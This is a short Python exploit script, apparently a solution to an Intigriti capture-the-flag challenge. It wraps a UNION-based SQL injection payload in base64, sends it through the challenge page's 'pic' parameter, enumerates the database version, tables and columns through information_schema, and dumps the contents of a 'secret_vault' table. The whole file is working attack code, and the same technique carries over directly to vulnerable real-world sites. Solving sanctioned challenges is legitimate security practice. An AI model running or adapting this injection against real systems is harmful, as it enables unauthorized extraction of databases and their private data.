#!/usr/bin/env python3
"""Dump the Critter Gallery database through the base64-wrapped `pic` parameter."""
import base64, re, sys, time, urllib.parse, urllib.request

URL = "https://challenge-0926.challenges.intigriti.io/challenge.php"
DESC = re.compile(r'<div class="desc[^"]*">(.*?)</div>', re.S)

def query(sql, delay=0.4):
    """Run `sql` as the injected UNION branch and return the rendered cell."""
    payload = f"zzz' UNION SELECT {sql}#"
    pic = urllib.parse.quote(base64.b64encode(payload.encode()).decode())
    with urllib.request.urlopen(f"{URL}?pic={pic}") as r:
        body = r.read().decode("utf-8", "replace")
    time.sleep(delay)                      # stay under the 3 req/sec limit
    if not body:                           # empty body == the query did not parse
        return None
    m = DESC.search(body)
    return m.group(1).replace("<br>", "\n").strip() if m else ""

if __name__ == "__main__":
    print("db      :", query("database()"))
    print("version :", query("@@version"))
    tables = query("group_concat(table_name) FROM information_schema.tables "
                   "WHERE table_schema=database()")
    print("tables  :", tables)
    for table in tables.split(","):
        cols = query("group_concat(column_name) FROM information_schema.columns "
                     f"WHERE table_schema=database() AND table_name=0x{table.encode().hex()}")
        print(f"  {table}({cols})")
    print("\nflag    :", query("group_concat(note) FROM secret_vault"))
